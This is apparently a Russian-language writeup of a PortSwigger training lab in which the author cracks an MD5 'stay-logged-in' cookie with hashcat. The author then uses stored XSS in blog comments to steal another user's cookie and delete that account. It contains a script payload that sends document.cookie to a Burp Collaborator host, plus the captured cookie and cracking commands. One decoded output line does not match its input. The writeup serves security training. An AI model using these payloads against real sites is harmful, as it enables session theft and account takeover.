---
title: "Offline password cracking"
date: 2025-10-02
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-offline-password-cracking"
classes: wide
---

В данной лабе присутствует [XSS](https://ru.wikipedia.org/wiki/%D0%9C%D0%B5%D0%B6%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%D1%8B%D0%B9_%D1%81%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%B8%D0%BD%D0%B3) уязвимость. Для решения лабы необходимо украсть `stay-logged-in` `Cookie` у `carlos`, получить доступ к аккаунту и удалить его. Даны креды от аккаунта `wiener`:`peter`.

```
https://0a68003203d2c5418051033700a50089.web-security-academy.net
```

## Solution

Зайду под данным аккаунтом. Мне выставили куку `stay-logged-in`:

```http
GET / HTTP/2
Host: 0a68003203d2c5418051033700a50089.web-security-academy.net
Cookie: session=xz39tRycULdqsRiWBn61J1oQhifRx5gW; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a68003203d2c5418051033700a50089.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```

Попробую ее разобрать:

```bash
echo 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw' | base64 -d
wiener:cdh
```

Так-с, вторая часть похожа на пароль, попробую понять алгоритм хеширования, так как пароль мне известен:

```bash
hashcat -m 0 -a 0 md5.txt ~/wordlists/rockyou.txt
51dc30ddc473d43a6011e9ebba6ca770:peter
```

С этим разобрался. Теперь нужно получить доступ к аккаунту `carlos`. Увидел секцию комментариев в постах блога. Попробую добавить туда `<script></script>`, так как известно, что есть `XSS` уязвимость.

```http
POST /post/comment HTTP/2
Host: 0a68003203d2c5418051033700a50089.web-security-academy.net
Cookie: session=xz39tRycULdqsRiWBn61J1oQhifRx5gW; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a68003203d2c5418051033700a50089.web-security-academy.net/post?postId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 174
Origin: https://0a68003203d2c5418051033700a50089.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers

postId=1&comment=%3Cscript%3Ealert%28%22comment%22%29%3C%2Fscript%3E&name=%3Cscript%3Ealert%28%22name%22%29%3C%2Fscript%3E&email=mail%40mail.com&website=http%3A%2F%2Fsite.com
```

И это сработало:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Offline_password_cracking/1.png){: height="200" .align-center}

Попробую украсть `cookie` у пользователя `carlos`. Для это использую `Burp Collaborator`. Также можно использовать свой сервер:

```js
<script>
document.location = "http://2lo3lq2q3rjgdhkuk2ps9lps4jaay2mr.oastify.com/" + document.cookie;
</script>
```

Мне пришел следующий запрос:

```http
GET /secret=hfAZzr9C3QNzL60PSGafiSqd0VYBPB6n;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1
Host: 2lo3lq2q3rjgdhkuk2ps9lps4jaay2mr.oastify.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```

Разберу значение `Cookie`:

```bash
echo 'Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz' | base64 -d                                                carlos:26323c16d5f4dabff3bb136f2460a943

hashcat -m 0 -a 0 md5.txt ~/wordlists/rockyou.txt --show                                                               26323c16d5f4dabff3bb136f2460a943:onceuponatime
```

Попробую залогиниться со следующим кредами `carlos`:`onceuponatime`.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Offline_password_cracking/2.png){: height="200" .align-center}

Получилось. Теперь удалю аккаунт:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Offline_password_cracking/3.png){: height="200" .align-center}

У меня была мысль попробовать удалить аккаунт через `XSS`, но для удаления аккаунта требуется ввести пароль, поэтому ничего бы не вышло(